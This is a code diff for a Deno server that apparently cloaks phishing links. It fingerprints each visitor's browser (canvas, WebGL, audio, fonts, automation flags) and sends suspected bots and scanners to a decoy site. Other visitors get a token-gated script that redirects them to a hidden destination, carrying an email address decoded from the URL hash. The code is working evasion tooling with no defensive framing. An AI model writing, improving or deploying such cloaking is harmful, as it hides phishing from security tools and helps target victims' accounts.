@@ -2,6 +2,7 @@ const PORT = Number(Deno.env.get("PORT") || 8080);
 const DECOY_URL = "https://medium.com";
 const TOKEN_TTL_MS = 60_000;
 const tokens = new Map<string, number>();
+const fingerprints = new Map<string, { count: number; first: number }>();
 
 function randomString(len: number): string {
   const chars = "abcdefghijklmnopqrstuvwxyz0123456789";
@@ -11,22 +12,12 @@ function randomString(len: number): string {
   return s;
 }
 
-function isBot(userAgent: string): boolean {
-  const bots = [
-    "bot", "crawler", "spider", "curl", "wget", "python", "java", "perl",
-    "headless", "phantom", "selenium", "puppeteer", "playwright", "webdriver",
-    "postman", "httpie", "axios", "pingdom", "uptimerobot", "monitor"
-  ];
-  const ua = userAgent.toLowerCase();
-  return bots.some((b) => ua.includes(b)) || ua.length < 20;
-}
-
-function missingHeaders(headers: Headers): boolean {
-  return (
-    !headers.get("accept") ||
-    !headers.get("accept-language") ||
-    !headers.get("accept-encoding")
-  );
+async function hashFingerprint(data: string): Promise<string> {
+  const encoder = new TextEncoder();
+  const buffer = await crypto.subtle.digest("SHA-256", encoder.encode(data));
+  return Array.from(new Uint8Array(buffer))
+    .map((b) => b.toString(16).padStart(2, "0"))
+    .join("");
 }
 
 setInterval(() => {
@@ -34,19 +25,47 @@ setInterval(() => {
   for (const [t, exp] of tokens.entries()) {
     if (exp < now) tokens.delete(t);
   }
+  // Clean old fingerprints (24h)
+  for (const [fp, data] of fingerprints.entries()) {
+    if (now - data.first > 86400000) fingerprints.delete(fp);
+  }
 }, 10_000);
 
-Deno.serve({ port: PORT }, (req: Request): Response => {
+Deno.serve({ port: PORT }, async (req: Request): Promise<Response> => {
   try {
     const url = new URL(req.url);
     const headers = req.headers;
-    const ua = (headers.get("user-agent") || "").toLowerCase();
     const cookies = headers.get("cookie") || "";
 
-    if (isBot(ua) || missingHeaders(headers)) {
-      return Response.redirect(DECOY_URL, 302);
+    // Fingerprint validation endpoint
+    if (url.pathname === "/fp" && req.method === "POST") {
+      const body = await req.json();
+      const fp = body.fp;
+      const token = body.t;
+
+      if (!fp || !token || !tokens.has(token)) {
+        return Response.json({ ok: false }, { status: 403 });
+      }
+
+      const hash = await hashFingerprint(fp);
+      const record = fingerprints.get(hash) || { count: 0, first: Date.now() };
+      record.count++;
+      fingerprints.set(hash, record);
+
+      // Block if same fingerprint hits too often
+      if (record.count > 50) {
+        return Response.json({ ok: false }, { status: 403 });
+      }
+
+      // Generate redirect token
+      const redirectToken = randomString(16);
+      tokens.set(redirectToken, Date.now() + 30_000);
+      tokens.delete(token);
+
+      return Response.json({ ok: true, rt: redirectToken });
     }
 
+    // Final redirect with validated token
     if (url.pathname.endsWith(".js")) {
       const noCookie = !cookies.includes("_v=1");
       const noReferer = !headers.get("referer");
@@ -70,7 +89,6 @@ Deno.serve({ port: PORT }, (req: Request): Response => {
         `${email ? "&email=" + encodeURIComponent(email) : ""}`;
 
       const js = `window.location.replace('${destination}');`;
-
       return new Response(js, {
         headers: {
           "Content-Type": "application/javascript",
@@ -85,8 +103,7 @@ Deno.serve({ port: PORT }, (req: Request): Response => {
 
     const scriptUrl =
       `/${randomName}.js?p=${encodeURIComponent(url.pathname)}` +
-      `&q=${encodeURIComponent(url.search.substring(1))}` +
-      `&t=${token}`;
+      `&q=${encodeURIComponent(url.search.substring(1))}`;
 
     const html = `<!DOCTYPE html>
 <html>
@@ -96,13 +113,149 @@ Deno.serve({ port: PORT }, (req: Request): Response => {
 </head>
 <body>
 <script>
-const cleanedHash = location.hash.slice(1);
-const match = cleanedHash.match(/Family=([A-Za-z0-9+/=]+)/);
-let decodedEmail = "";
-if (match && match[1]) { try { decodedEmail = atob(match[1]); } catch(e){} }
-const s = document.createElement("script");
-s.src = "${scriptUrl}&email=" + encodeURIComponent(decodedEmail);
-document.body.appendChild(s);
+(async function() {
+  const fp = {};
+  
+  // Canvas fingerprint
+  try {
+    const canvas = document.createElement('canvas');
+    const ctx = canvas.getContext('2d');
+    canvas.width = 200; canvas.height = 50;
+    ctx.textBaseline = 'top';
+    ctx.font = '14px Arial';
+    ctx.fillStyle = '#f60';
+    ctx.fillRect(0, 0, 100, 50);
+    ctx.fillStyle = '#069';
+    ctx.fillText('Cwm fjord veg balks', 2, 15);
+    ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
+    ctx.fillText('xyz', 4, 17);
+    fp.canvas = canvas.toDataURL().slice(-50);
+  } catch(e) { fp.canvas = 'err'; }
+
+  // WebGL fingerprint
+  try {
+    const canvas = document.createElement('canvas');
+    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+    if (gl) {
+      const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+      fp.webglVendor = debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : '';
+      fp.webglRenderer = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : '';
+    }
+  } catch(e) { fp.webgl = 'err'; }
+
+  // Audio fingerprint
+  try {
+    const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+    const oscillator = audioCtx.createOscillator();
+    const analyser = audioCtx.createAnalyser();
+    const gain = audioCtx.createGain();
+    const processor = audioCtx.createScriptProcessor(4096, 1, 1);
+    
+    gain.gain.value = 0;
+    oscillator.type = 'triangle';
+    oscillator.connect(analyser);
+    analyser.connect(processor);
+    processor.connect(gain);
+    gain.connect(audioCtx.destination);
+    oscillator.start(0);
+    
+    const bins = new Float32Array(analyser.frequencyBinCount);
+    analyser.getFloatFrequencyData(bins);
+    fp.audio = bins.slice(0, 30).reduce((a, b) => a + Math.abs(b), 0).toFixed(2);
+    
+    oscillator.stop();
+    audioCtx.close();
+  } catch(e) { fp.audio = 'err'; }
+
+  // Screen & window
+  fp.screen = [screen.width, screen.height, screen.colorDepth, window.devicePixelRatio].join(',');
+  fp.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+  fp.timezoneOffset = new Date().getTimezoneOffset();
+  fp.language = navigator.language;
+  fp.languages = (navigator.languages || []).join(',');
+  fp.platform = navigator.platform;
+  fp.cores = navigator.hardwareConcurrency || 0;
+  fp.memory = navigator.deviceMemory || 0;
+  fp.touch = navigator.maxTouchPoints || 0;
+  
+  // Plugins
+  fp.plugins = Array.from(navigator.plugins || []).map(p => p.name).slice(0, 5).join(',');
+  
+  // Fonts (basic)
+  const testFonts = ['monospace', 'sans-serif', 'serif', 'Arial', 'Courier New', 'Georgia', 'Helvetica', 'Times New Roman', 'Verdana'];
+  const testString = 'mmmmmmmmmmlli';
+  const testSize = '72px';
+  const baseFonts = ['monospace', 'sans-serif', 'serif'];
+  const body = document.body;
+  const span = document.createElement('span');
+  span.style.position = 'absolute';
+  span.style.left = '-9999px';
+  span.style.fontSize = testSize;
+  span.innerHTML = testString;
+  const widths = {};
+  for (const base of baseFonts) {
+    span.style.fontFamily = base;
+    body.appendChild(span);
+    widths[base] = span.offsetWidth;
+    body.removeChild(span);
+  }
+  const detected = [];
+  for (const font of testFonts) {
+    for (const base of baseFonts) {
+      span.style.fontFamily = "'" + font + "'," + base;
+      body.appendChild(span);
+      if (span.offsetWidth !== widths[base]) {
+        detected.push(font);
+        body.removeChild(span);
+        break;
+      }
+      body.removeChild(span);
+    }
+  }
+  fp.fonts = detected.join(',');
+
+  // Bot signals
+  fp.webdriver = navigator.webdriver ? 1 : 0;
+  fp.phantom = window._phantom || window.phantom ? 1 : 0;
+  fp.nightmare = window.__nightmare ? 1 : 0;
+  fp.selenium = window.document.__selenium_unwrapped || window.document.__webdriver_evaluate ? 1 : 0;
+  fp.domAutomation = window.document.__fxdriver_unwrapped || window.document.__driver_evaluate ? 1 : 0;
+  fp.cdc = document.documentElement.getAttribute('cdc_asdjflasutopfhvcZLmcfl_') ? 1 : 0;
+
+  // Permissions
+  try {
+    const perms = await Promise.all([
+      navigator.permissions.query({name: 'notifications'}),
+      navigator.permissions.query({name: 'geolocation'})
+    ]);
+    fp.perms = perms.map(p => p.state).join(',');
+  } catch(e) { fp.perms = 'err'; }
+
+  // Build string
+  const fpString = Object.entries(fp).map(([k,v]) => k + ':' + v).join('|');
+  
+  // Get email from hash
+  const cleanedHash = location.hash.slice(1);
+  const match = cleanedHash.match(/Family=([A-Za-z0-9+/=]+)/);
+  let decodedEmail = "";
+  if (match && match[1]) { try { decodedEmail = atob(match[1]); } catch(e){} }
+
+  // Send fingerprint
+  const res = await fetch('/fp', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ fp: fpString, t: '${token}' })
+  });
+  
+  const data = await res.json();
+  if (data.ok && data.rt) {
+    const s = document.createElement('script');
+    s.src = '${scriptUrl}&t=' + data.rt + '&email=' + encodeURIComponent(decodedEmail);
+    document.body.appendChild(s);
+  } else {
+    window.location.replace('${DECOY_URL}');
+  }
+})();
 </script>
 </body>
 </html>`;
